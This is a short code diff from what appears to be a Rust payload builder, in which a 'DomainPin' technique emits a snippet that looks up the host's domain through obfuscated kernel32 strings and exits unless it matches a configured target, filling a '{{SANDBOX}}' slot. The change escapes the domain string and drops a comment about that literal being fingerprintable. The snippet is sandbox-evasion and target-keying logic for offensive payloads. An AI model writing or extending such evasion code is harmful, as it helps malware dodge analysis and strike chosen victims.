@@ -10,10 +10,8 @@ impl Technique for DomainPin {
         if expected.is_empty() {
             return Ok(());
         }
+        let expected_escaped = expected.replace('\\', "\\\\").replace('"', "\\\"");
 
-        // The expected domain still ends up as a plaintext string literal in
-        // the payload; that is a build-time user input, not a fingerprintable
-        // constant, so leave it as is.
         let snippet = format!(
 r#"fn {{{{FN_EVASION_DOMAIN}}}}_get_name() -> Option<String> {{
     static OBF_MOD: &[u8] = &{{{{STR_KERNEL32}}}};
@@ -42,7 +40,7 @@ fn {{{{FN_EVASION_DOMAIN}}}}() {{
         None => {{ std::process::exit(0); }}
     }}
 }}
-{{{{FN_EVASION_DOMAIN}}}}();"#, expected);
+{{{{FN_EVASION_DOMAIN}}}}();"#, expected_escaped);
 
         ctx.append_replacement("{{SANDBOX}}", snippet);
         Ok(())
